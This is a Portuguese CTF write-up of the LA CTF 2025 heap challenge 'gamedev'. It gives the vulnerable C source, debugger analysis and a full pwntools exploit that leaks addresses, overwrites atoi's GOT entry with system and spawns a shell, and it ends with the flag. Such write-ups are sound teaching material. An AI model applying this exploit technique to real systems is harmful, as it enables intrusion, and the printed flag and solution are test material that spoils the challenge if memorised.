# WriteUp: gamedev
## Descrição do Desafio:
**Autor:** bliutech \
**Categoria:** pwn \
**Descrição:**
> You've heard of rogue-likes, but have you heard of heap-likes?

### Arquivos
| Arquivo | Descrição |
| ------- | --------- |
| chall | Executável. |
| chall.c | Código-fonte. |
| Dockerfile | Arquivo docker. |
| ld-linux-x86-64.so.2 | Linker da *libc* |
| libc.so.6 | *libc* |
| solve.py | Script em Python que resolve o desafio. |

> 📥 **Download:** [Arquivos](https://github.com/HawkSecUnifei/Writeups/raw/refs/heads/main/2025/LA_CTF/gamedev/Arquivos.zip)

## Passo a Passo da Solução
### 1. Análise dos arquivos fornecidos
Este desafio fornece tanto o executável como o código-fonte. Analisando o código, vemos que ele é mais complexo, no sentido de não ser apenas 1 ou 2 funções, porém sua temática é bem interessante, já que ele permite o usuário criar 8 níveis de "dungeons", escrever dados em cada um desses níveis, ler o que está nesses níveis, e como qualquer *rogue-like*, acessar tais níveis.

Para cada nível acessado, as opções são as mesmas, criar, escrever, ler, e acessar. 

{% code title="chall.c" overflow="wrap" lineNumbers="true" %}

```c
#include <stdio.h>
#include <stdlib.h>

struct Level *start = NULL;
struct Level *prev = NULL;
struct Level *curr = NULL;

struct Level
{
    struct Level *next[8];
    char data[0x20];
};

int get_num()
{
    char buf[0x10];
    fgets(buf, 0x10, stdin);
    return atoi(buf);
}

void create_level()
{
    if (prev == curr) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }

    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }
    
    struct Level *level = malloc(sizeof(struct Level));
    if (level == NULL) {
        puts("Failed to allocate level.");
        return;
    }

    level->data[0] = '\0';
    for (int i = 0; i < 8; i++)
        level->next[i] = NULL;

    prev = level;

    if (start == NULL)
        start = level;
    else
        curr->next[idx] = level;
}

void edit_level()
{
    if (start == NULL || curr == NULL) {
        puts("No level to edit.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Enter level data: ");
    fgets(curr->data, 0x40, stdin);
}

void test_level()
{
    if (start == NULL || curr == NULL) {
        puts("No level to test.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Level data: ");
    write(1, curr->data, sizeof(curr->data));
    putchar('\n');
}

void explore()
{
    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }

    if (curr == NULL) {
        puts("No level to explore.");
        return;
    }
    
    curr = curr->next[idx];
}

void reset()
{
    curr = start;
}

void menu()
{
    puts("==================");
    puts("1. Create level");
    puts("2. Edit level");
    puts("3. Test level");
    puts("4. Explore");
    puts("5. Reset");
    puts("6. Exit");

    int choice;
    printf("Choice: ");
    choice = get_num();

    if (choice < 1 || choice > 6)
        return;
    
    switch (choice)
    {
        case 1:
            create_level();
            break;
        case 2:
            edit_level();
            break;
        case 3:
            test_level();
            break;
        case 4:
            explore();
            break;
        case 5:
            reset();
            break;
        case 6:
            exit(0);
    }
}

void init()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    // Add starting level
    start = malloc(sizeof(struct Level));
    start->data[0] = '\0';
    for (int i = 0; i < 8; i++)
        start->next[i] = NULL;
    curr = start;
}

int main()
{
    init();
    puts("Welcome to the heap-like game engine!");
    printf("A welcome gift: %p\n", main);
    while (1)
        menu();
    return 0;
}
```

{% endcode %}

Analisando a fundo cada função, podemos identificar algumas coisas interessantes:
- Temos um vazamento do endereço da `main()`, dessa forma já podemos burlar o `PIE` do executável.
- Na função de escrever no nível, nós podemos escrever `0x20` *bytes* a mais do que ele armazena.
- A função de explorar não faz nenhuma verificação em relação ao endereço, ou seja, podemos acessar qualquer endereço que esteja na índice inserido.

Com isso uma ideia já fica em mente, com o *overflow* podemos sobrescrever o *chunk* da frente para que um de seus índices contenha um endereço da tabela `.got`, e dessa forma, podemos acessar esse endereço, ler o que tem nele para vazar um endereço da *libc*, e em seguida sobrescrever esse valor para ser a função `system()`. A questão fica, qual função da tabela `.got` devemos sobrescrever, por que ainda temos que passar `/bin/sh` para a função.

E é aí, que olhando para a função `get_num()`, identificamos nosso alvo, a função `atoi()` que é chamada como `atoi(buf)`.

### 2. Exploit
Já sabendo o que fazer, a solução se torna bem simples, só falta descobrir o *offset* para chegar nos dados (`curr->data`, se `curr` for exatamente o endereço da `.got`, nós não escreveremos nela e nem vazaremos o endereço), e descobrir quantos *bytes* escrever até chegar no índice do próximo *chunk*. Com o **pwndbg**, e o comando `vis_heap_chunks`, podemos descobrir a quantidade de *bytes*.

```bash
pwndbg> vis_heap_chunks

...
0x5555555592a0  0x0000555555559310      0x0000555555559380      ..UUUU....UUUU..
0x5555555592b0  0x0000000000000000      0x0000000000000000      ................
0x5555555592c0  0x0000000000000000      0x0000000000000000      ................
0x5555555592d0  0x0000000000000000      0x0000000000000000      ................
0x5555555592e0  0x0000000000000000      0x0000000000000000      ................
0x5555555592f0  0x0000000000000000      0x0000000000000000      ................
0x555555559300  0x0000000000000000      0x0000000000000071      ........q.......
0x555555559310  0x0000000000000000      0x0000000000000000      ................
0x555555559320  0x0000000000000000      0x0000000000000000      ................
0x555555559330  0x0000000000000000      0x0000000000000000      ................
0x555555559340  0x0000000000000000      0x0000000000000000      ................
0x555555559350  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x555555559360  0x4141414141414141      0x0a41414141414141      AAAAAAAAAAAAAAA.
0x555555559370  0x0000000000000000      0x0000000000000071      ........q.......
0x555555559380  0x0000000000000000      0x0000000000000000      ................
0x555555559390  0x0000000000000000      0x0000000000000000      ................
0x5555555593a0  0x0000000000000000      0x0000000000000000      ................
0x5555555593b0  0x0000000000000000      0x0000000000000000      ................
0x5555555593c0  0x0000000000000000      0x0000000000000000      ................
0x5555555593d0  0x0000000000000000      0x0000000000000000      ................
0x5555555593e0  0x0000000000000000      0x0000000000020c21      ........!.......         <-- Top chunk
```

{% hint style="info" %}

**Nota:** No **pwndbg** os *chunks* saem coloridos facilitando a leitura.

{% endhint %}

Com isso descobrimos que devemos escrever 48 caracteres, e os próximos começarão a escrever nos índices daquele *chunk*. Agora, o *offset* podemos descobrir direto pelo assembly.

{% code title="assembly edit_level" overflow="wrap" lineNumbers="true" %}

```asm
pwndbg> disass edit_level
Dump of assembler code for function edit_level:
   0x00005555555552e5 <+0>:     push   rbp
   0x00005555555552e6 <+1>:     mov    rbp,rsp
   0x00005555555552e9 <+4>:     mov    rax,QWORD PTR [rip+0x2d90]        # 0x555555558080 <start>
   0x00005555555552f0 <+11>:    test   rax,rax
   0x00005555555552f3 <+14>:    je     0x555555555301 <edit_level+28>
   0x00005555555552f5 <+16>:    mov    rax,QWORD PTR [rip+0x2d94]        # 0x555555558090 <curr>
   0x00005555555552fc <+23>:    test   rax,rax
   0x00005555555552ff <+26>:    jne    0x555555555312 <edit_level+45>
   0x0000555555555301 <+28>:    lea    rax,[rip+0xd6f]        # 0x555555556077
   0x0000555555555308 <+35>:    mov    rdi,rax
   0x000055555555530b <+38>:    call   0x555555555040 <puts@plt>
   0x0000555555555310 <+43>:    jmp    0x55555555537f <edit_level+154>
   0x0000555555555312 <+45>:    mov    rdx,QWORD PTR [rip+0x2d77]        # 0x555555558090 <curr>
   0x0000555555555319 <+52>:    mov    rax,QWORD PTR [rip+0x2d68]        # 0x555555558088 <prev>
   0x0000555555555320 <+59>:    cmp    rdx,rax
   0x0000555555555323 <+62>:    je     0x555555555338 <edit_level+83>
   0x0000555555555325 <+64>:    mov    rdx,QWORD PTR [rip+0x2d64]        # 0x555555558090 <curr>
   0x000055555555532c <+71>:    mov    rax,QWORD PTR [rip+0x2d4d]        # 0x555555558080 <start>
   0x0000555555555333 <+78>:    cmp    rdx,rax
   0x0000555555555336 <+81>:    jne    0x555555555349 <edit_level+100>
   0x0000555555555338 <+83>:    lea    rax,[rip+0xcc9]        # 0x555555556008
   0x000055555555533f <+90>:    mov    rdi,rax
   0x0000555555555342 <+93>:    call   0x555555555040 <puts@plt>
   0x0000555555555347 <+98>:    jmp    0x55555555537f <edit_level+154>
   0x0000555555555349 <+100>:   lea    rax,[rip+0xd39]        # 0x555555556089
   0x0000555555555350 <+107>:   mov    rdi,rax
   0x0000555555555353 <+110>:   mov    eax,0x0
   0x0000555555555358 <+115>:   call   0x555555555060 <printf@plt>
   0x000055555555535d <+120>:   mov    rax,QWORD PTR [rip+0x2d0c]        # 0x555555558070 <stdin@GLIBC_2.2.5>
   0x0000555555555364 <+127>:   mov    rdx,QWORD PTR [rip+0x2d25]        # 0x555555558090 <curr>
   0x000055555555536b <+134>:   lea    rcx,[rdx+0x40]
   0x000055555555536f <+138>:   mov    rdx,rax
   0x0000555555555372 <+141>:   mov    esi,0x40
   0x0000555555555377 <+146>:   mov    rdi,rcx
   0x000055555555537a <+149>:   call   0x555555555070 <fgets@plt>
   0x000055555555537f <+154>:   pop    rbp
   0x0000555555555380 <+155>:   ret
End of assembler dump.
```

{% endcode %}

Note que antes de chamar a `fgets`, ele passa como *buffer* o `curr` + `0x40`, e aí está o nosso *offset*. 

{% hint style="warning" %}

**Importante:** Como em nenhum momento esse *chunk* é liberado, não devemos nos preocupar com o programa identificando um erro relacionado ao *chunk* corrompido. 

{% endhint %}

{% code title="solve.py" overflow="wrap" lineNumbers="true" %}

```py
from pwn import *

elf = context.binary = ELF("./chall")
libc = ELF("./libc.so.6")
#p = process()
p = remote("ip", porta)

def create(idx):
    p.sendlineafter(b"Choice: ", b"1")
    p.sendlineafter(b"index: ", idx)

def write(payload):
    p.sendlineafter(b"Choice: ", b"2")
    p.sendlineafter(b"data: ", payload)

def test():
    p.sendlineafter(b"Choice: ", b"3")
    p.recvuntil(b"data: ")
    return int.from_bytes(p.recvline()[:8], byteorder="little")

def explore(idx):
    p.sendlineafter(b"Choice: ", b"4")
    p.sendlineafter(b"index: ", idx)

def reset():
    p.sendlineafter(b"Choice: ", b"5")

# Vazamento da main.
p.recvuntil(b"gift: ")
main_leak = int(p.recvline().decode()[:-1], 16)
elf.address = main_leak - elf.sym["main"]

# Preparando chunks.
create(b"0")
create(b"1") # <- prev
explore(b"0") # <- curr

# Montando payload
payload = b"A" * 0x30 + p64(elf.got["atoi"] - 0x40)
write(payload)

# Vazando endereço da atoi.
reset()
create(b"2")
explore(b"1")
explore(b"0")
atoi_leak = test()
libc.address = atoi_leak - libc.sym["atoi"]

# Chamando a system.
write(p64(libc.sym["system"]))
p.sendlineafter(b"Choice: ", b"/bin/sh")
p.interactive()
```

{% endcode %}

{% hint style="warning" %}

**Importante:** O ideal para esse desafio é usar uma ferramenta como o **pwninit** que cria um novo executável vinculado com a *libc* informada, pois usando o executável normal e sem o *linker*, a *libc* utilizada será a do sistema. No caso, eu não usei o **pwninit** e por isso tive que abrir a *libc* separadamente na solução.

{% endhint %}

### Flag
`lactf{ro9u3_LIk3_No7_R34LlY_RO9U3_H34P_LIK3_nO7_r34llY_H34P}`

## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)